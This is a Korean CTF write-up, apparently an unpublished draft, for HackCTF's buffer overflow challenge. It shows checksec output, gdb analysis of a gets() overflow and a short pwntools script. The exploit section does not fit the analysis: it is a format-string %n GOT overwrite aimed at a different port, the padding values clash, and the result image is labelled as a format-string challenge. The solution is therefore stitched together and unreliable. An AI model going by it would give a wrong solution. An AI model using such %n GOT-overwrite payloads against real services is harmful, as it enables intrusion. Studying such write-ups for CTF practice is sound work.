---
title:  "[HackCTF] 내 버퍼가 흘러넘친다! 풀이"
categories:
    - Pwnable
tags:
    - ctf.j0n9hyun.xyz
toc: true
published: false
---
[HackCTF] 내 버퍼가 흘러넘친다! 풀이

# Environments

|Name|Config|
|:---:|:---|
|CPU|Apple M1|
|Architecture|ARM64|
|OS|Microsoft Windows 11 on ARM|
|Tools|- gdb-peda<br/>- Hex-Rays IDA 7.5|

# Problem
![](/assets/HCTF/basic_bof-2-1.png)
```
Get Input
Get Input
```

- URL: [ctf.j0n9hyun.xyz/challenges#내%20버퍼가%20흘러넘친다!!!](https://ctf.j0n9hyun.xyz/challenges#내%20버퍼가%20흘러넘친다!!!)
- 요약: `prob1`, `nc ctf.j0n9hyun.xyz 3003` 으로부터 BOF를 통해 flag 찾기

# File Format
![](/assets/HCTF/basic_bof-2-0.png)
![](/assets/HCTF/basic_bof-2-3.png)

> x86 ELF LSB Executable, Not Stripped, Not UPX Packed

# checksec

|Name|Status|
|:---:|:---|
|CANARY|disabled|
|FORTIFY|disabled|
|NX|disabled|
|PIE|disabled|
|RELRO|Partial|

- Can overwrite GOT

# Solution
![](/assets/HCTF/basic_bof-2-2.png)

우선 `gdb-peda`를 통해 `main` Func를 들여다 보면 BOF 문제여서 눈에 띄는 몇가지가 있다.

`0x080484ce`에 무척 수상하고 적절한(?) `0x14`가 존재 한다.

그리고 `gets`와 `read` Func를 통해 값을 입력 받는 부분이다. `read` 함수의 3번째 인자가 `0x32` 라는 값이 있다. 하지만 `gets`를 보면 별 다른 길이 관련 인자가 없다. 이 부분을 통해 "**배열이 50으로 선언된게 아니라면 BOF가 터지겠다**" 라는 생각을 통해 접근.

우선 아직 확신이 서질 않아 iDEA로 이동하여 확인 해본다.

0x804a060 0xffffd4e4

# Exploit Scenario
```
# p32: 4 Byte packing
payload = p32(0x804a00c) + "%13451096x%n"
```

# Exploit Code
```
from pwn import *
context.log_level = "DEBUG"

p = remote("ctf.j0n9hyun.xyz",3002)
payload = p32(0x804a00c) + "%134514096x%n"

p.sendline(payload)
p.interactive()
```

# Result
![](/assets/HCTF/basic_fsb-12.png)